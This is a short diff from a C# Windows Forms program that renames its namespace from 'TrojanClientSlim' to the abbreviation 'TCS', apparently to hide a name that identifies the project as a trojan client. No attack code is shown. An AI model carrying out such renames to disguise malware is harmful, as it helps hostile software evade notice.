@@ -4,7 +4,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
-namespace TrojanClientSlim
+namespace TCS
 {
     static class Program
     {
